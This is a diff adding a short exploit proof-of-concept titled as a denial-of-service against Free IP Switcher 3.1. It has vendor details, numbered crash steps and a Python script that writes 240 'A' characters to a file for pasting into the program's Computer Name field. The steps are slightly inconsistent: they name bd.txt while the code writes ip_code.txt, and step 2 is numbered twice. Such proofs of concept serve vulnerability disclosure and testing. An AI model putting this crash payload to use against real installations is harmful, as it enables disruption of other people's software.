@@ -1,0 +1,22 @@
+#Exploit Title: Free IP Switcher 3.1 - Denial of Service (PoC)
+#Discovery by: Victor Mondragón
+#Discovery Date: 2018-02-14
+#Vendor Homepage: http://www.eusing.com/index.html
+#Software Link: http://www.eusing.com/ipscan/free_ip_scanner.htm
+#Tested Version: 3.1 
+#Tested on: Windows 10 Single Language x64 / Windows 7 x32 Service Pack 1
+
+#Steps to produce the crash:
+#1.- Run python code: Free_IP_Switcher_3.1.py
+#2.- Open bd.txt and copy content to clipboard
+#2.- Open Free IP Switcher 
+#3.- Select "Network Adapter"
+#4.- In "Additional" enable "Computer Name" and Paste ClipBoard
+#5.- Click on "Activate"
+#6.- Crashed
+
+cod = "\x41" * 240
+
+f = open('ip_code.txt', 'w')
+f.write(cod)
+f.close()
